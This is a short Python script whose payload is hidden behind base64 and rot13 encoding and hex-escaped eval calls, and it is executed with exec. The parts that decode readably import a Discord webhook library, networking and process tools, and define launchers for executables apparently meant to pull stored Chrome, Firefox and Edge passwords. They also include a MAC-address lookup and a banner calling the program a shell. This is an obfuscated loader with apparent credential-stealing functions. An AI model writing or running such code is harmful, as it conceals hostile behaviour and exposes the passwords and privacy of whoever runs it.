import base64, codecs
magic = 'ZnJvbSBwbHkgaW1wb3J0IGxleCwgeWFjYwppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBzdWJwcm9jZXNzLCBzeXMKaW1wb3J0IGpzb24KaW1wb3J0IHJlCmZyb20gZmxhc2sgaW1wb3J0IEZsYXNrLCByZW5kZXJfdGVtcGxhdGUKaW1wb3J0IHBzdXRpbAppbXBvcnQgc2h1dGlsCmltcG9ydCB1cmxsaWIucmVxdWVzdAppbXBvcnQgc29ja2V0CmZyb20gZGlzY29yZHdlYmhvb2sgaW1wb3J0IERpc2NvcmQKZnJvbSByZXF1ZXN0cyBpbXBvcnQgZ2V0CmltcG9ydCB0aW1lCmZyb20gZ2V0bWFjIGltcG9ydCBnZXRfbWFjX2FkZHJlc3MKaW1wb3J0IHJlcXVlc3RzCmRlZiBraWxsKCk6CiAgZXhpdCgxKQpkZWYgaG9sZCh4KToKICB0aW1lLnNsZWVwKHgpCmRlZiBiYXJrKGkpOgogIHByaW50KGkpCmRlZiBtYWMoKToKICBnZXRfbWFjX2FkZHJlc'
love = '3ZbXDcxMJLtrTyjXPx6PvNtpUIvoTywK2yjVQ0tVUWypKIyp3EmYzqyqPtvnUE0pQbiY3q0MzymoKycpP5wo20iqTI4qPVcYaEyrUDXVPOjpzyhqPujqJWfnJAsnKNcPzEyMvOxoJImp2SaMFu3MJWbo29eYPOgMKAmLJqyXGbXVPOxnKAwo3WxVQ0tETymL29lMPu1pzj9q2IvnT9inlxXVPOxnKAwo3WxYaOip3DbL29hqTIhqQ1gMKAmLJqyXDcxMJLtq2IvMT93ovu3MJWmnKEyXGbXVPO1pzjtCFO3MJWmnKEyPvNtnUEgoS9iqKEjqKEsozSgMFN9VPqxo3qhoT9uMP5bqT1fWjbtVUWypFN9VUWypKIyp3EmYzqyqPu1pzjfVPqbqT1fYaOupaAypvpcPvNtq2y0nPOipTIhXTu0oJkso3I0pUI0K25uoJHfVPq3WlxtLKZtMwbXVPNtVTLhq3WcqTHbpzIkYaEyrUDcPvNtVPOzYzAfo3AyXPxXMTIzVUqcMzywo24bXGbXVPOcoKOipaDtL29hPzEyMvOBD0uWnTIfpPtcBtbtVTWupzfbVx5QFRxtnK'
god = 'MgbWFkZSB3aXRoIHB5dGhvbiwgQysrLCBDLCBhbmQgSFRNTC9KUyB5b3UgYXJlIGN1cnJlbnRseSBpbiBhIHB5dGhvbiBzaGVsbCBzbyB5b3UgY2FuIHN0aWxsIHJ1biBweXRob24gc2NyaXB0cyBpbiBhIC5OQ0hJIGZpbGUiKQpkZWYgcGNpbmZvKCk6CiAgc3VicHJvY2Vzcy5Qb3BlbigiaW5mby5leGUiKQpkZWYgbG9hZGV4ZShleGUpOgogIG9zLnN0YXJ0ZmlsZShleGUpCmRlZiBDcGFzc3dvcmRzKCk6CiAgb3Muc3RhcnRmaWxlKCJDcGFzcy5leGUiKQpkZWYgRm94cGFzc3dvcmRzKCk6CiAgb3Muc3RhcnRmaWxlKCJGb3hwYXNzLmV4ZSIpCmRlZiBFcGFzc3dvcmRzKCk6CiAgb3Muc3RhcnRmaWxlKCJFcGFzcy5leGUiKQpkZWYgY3BwKGZpbGVOKToKICBvcy5zdGFydGZpbGUoImNwcGNvbXAuYmF0IikKZGVmIGNzKGZpbGVKKToKICBvcy5zdGFydGZpbGUoImNzY29tcC5iYXQiKQo'
destiny = 'wYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0wPvZgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYFZXVl0gYF0gYF0gYF0gVPOGIRSFIPOCEvOHG0gSGvNtYF0gYF0gYF0gYF0gVjbwYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0wPvZgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYFZXPtbXPvZgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYFZXVl0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gVjbwYF0gYF0gYF0gYF0tVRIBEPOCEvOHG0gSGvNtYF0gYF0gYF0gYF0gYF0wPvZgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYFZXVl0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gVj=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
